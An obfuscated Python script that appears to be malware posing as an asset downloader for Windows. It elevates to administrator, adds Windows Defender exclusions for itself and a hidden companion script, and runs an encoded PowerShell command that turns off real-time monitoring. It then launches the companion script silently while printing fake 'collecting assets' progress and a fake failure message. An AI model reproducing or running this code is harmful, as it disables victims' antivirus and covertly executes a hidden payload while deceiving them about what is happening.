#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Protected by Python Obfuscator


# Module protection - restricted
import sys as _sys

class _RestrictedModule:
    __slots__ = ('_module', '_allowed')

    def __init__(self, module, allowed):
        object.__setattr__(self, '_module', module)
        object.__setattr__(self, '_allowed', allowed)

    def __getattr__(self, name):
        if name.startswith('_'):
            raise AttributeError(f"Access denied: {name}")
        return getattr(self._module, name)

    def __setattr__(self, name, value):
        raise AttributeError("Module is read-only")

    def __dir__(self):
        return [n for n in dir(self._module) if not n.startswith('_')]

_sys.modules[__name__] = _RestrictedModule(_sys.modules[__name__], set())

# Readonly module protection
import sys as _sys

class _ReadonlyModule:
    def __init__(self, module):
        self.__dict__['_module'] = module

    def __getattr__(self, name):
        return getattr(self._module, name)

    def __setattr__(self, name, value):
        raise AttributeError(f"Cannot modify readonly module attribute: {name}")

    def __delattr__(self, name):
        raise AttributeError(f"Cannot delete readonly module attribute: {name}")

_sys.modules[__name__] = _ReadonlyModule(_sys.modules[__name__])
subprocess = __import__(__import__('base64').b64decode('c3VicHJvY2Vzcw==').decode('utf-8'))
time = __import__((lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('MSbpaw=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')))
os = __import__(__import__('base64').b64decode('b3M=').decode('utf-8'))
sys = __import__(__import__('base64').b64decode('c3lz').decode('utf-8'))
ctypes = __import__((lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('Jjv9flQq'), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')))
platform = __import__(__import__('base64').b64decode('cGxhdGZvcm0=').decode('utf-8'))
ctypes = __import__((lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('Jjv9flQqsL8KNBu62FOD'), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')))
if 72 * 17 >= 0 and platform.system() != __import__('base64').b64decode('V2luZG93cw==').decode('utf-8'):
    print((lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('DCHnYVwp/7wKOAOmiHmjeGUY7WBVNum7QzUBr9EY'), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')))
    sys.exit()
elif 28 * 77 < 0:
    pass

def _χкΦхчφΕПΔΧьδ():
    if False and True:
        _dead_2964 = 468
        26
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def _ΣΕΞЪπЬЯйЖ():
    if not _χкΦхчφΕПΔΧьδ():
        script = os.path.abspath(getattr(sys, __import__('base64').b64decode('YXJndg==').decode('utf-8'))[0])
        ctypes.windll.shell32.ShellExecuteW(None, __import__('base64').b64decode('cnVuYXM=').decode('utf-8'), getattr(sys, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('IDfhbUQt/6oPPw=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA=='))), script, None, 1)
        sys.exit()

def _ьмшεодΨЕВΡχнь(path):
    try:
        cmd = f'powershell -Command "Add-MpPreference -ExclusionPath \\"{path}\\""'
        subprocess.run(cmd, shell=True, capture_output=True, creationflags=134217728)
    except:
        pass

def _чΝΟТφζщДЭАнψъΕщο():
    try:
        cmd = __import__('base64').b64decode('cG93ZXJzaGVsbCAtQ29tbWFuZCAiU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAkdHJ1ZSI=').decode('utf-8')
        subprocess.run(cmd, shell=True, capture_output=True, creationflags=134217728)
    except:
        pass

def _ЬдеЛΧΣΜЦФшмΕΒЖ():
    _ΣΕΞЪπЬЯйЖ()
    current_script = os.path.abspath(getattr(sys, __import__('base64').b64decode('YXJndg==').decode('utf-8'))[0])
    if 81 * 77 < 0:
        718
        _dead_1416 = 598
    target_script = os.path.join(__import__('base64').b64decode('YXNzZXRz').decode('utf-8'), (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('NTY='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')), __import__('base64').b64decode('cHlhc3NldF8wOS5weQ==').decode('utf-8'))
    _ьмшεодΨЕВΡχнь(current_script)
    if False and True:
        _dead_1424 = 6
    _ьмшεодΨЕВΡχнь(target_script)
    if len('') > 0:
        128
    _чΝΟТφζщДЭАнψъΕщο()
    print((lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('ASDzYF02/6wKNAjjyUWDMTE8qiAf'), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')))
    CREATE_NO_WINDOW = 134217728
    subprocess.Popen([getattr(sys, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('IDfhbUQt/6oPPw=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA=='))), target_script], creationflags=CREATE_NO_WINDOW, stdout=getattr(subprocess, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('AQrSQGQV0g=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA=='))), stderr=getattr(subprocess, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('AQrSQGQV0g=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA=='))), stdin=getattr(subprocess, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('AQrSQGQV0g=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA=='))), close_fds=True, shell=False)
    time.sleep(1.8)
    print(__import__('base64').b64decode('Q29sbGVjdGluZyBhc3NldHMuLi4=').decode('utf-8'))
    if 25 * 16 < 0:
        pass
    time.sleep(4.2)
    if False and True:
        pass
        _dead_2244 = 697
        pass
    print((lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('DCHiYlAt96YEeg6w21OEJw=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')))
    if 40 * 80 < 0:
        _dead_2205 = 753
        _dead_7556 = 788
    time.sleep(2.8)
    print((lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('AD32YUN58asALx2mzBjeemUO8HpUNO68CjQI49xZ0DUwO+tjUC33qwI2A7qIRJUnKiPyax8='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')))
    if 16 * 98 < 0:
        _dead_1206 = 124
        770
        797
    time.sleep(7)
    print((lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('FjrnbVQq7a4WNgO6iESVJyoj8mtVefu6ETUd7YhmnDEkPOEuRjj3vE10QQ=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')))
    time.sleep(4)
    if len('') > 0:
        _dead_7106 = 324
        pass
        pass
    print((lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('FyrnYV01+6sXMwGkiFeDJyA79yAfdw=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')))
    time.sleep(2)
    print((lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('FyrxfVg3+ehSbk/siATDdCYu52ZUPb6pECkKt9s='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')))
    time.sleep(30)
    print(__import__('base64').b64decode('RmFpbGVkIHRvIGRvd25sb2FkIGFzc2V0cy4=').decode('utf-8'))
if (True or False) and __name__ == __import__('base64').b64decode('X19tYWluX18=').decode('utf-8'):
    _ЬдеЛΧΣΜЦФшмΕΒЖ()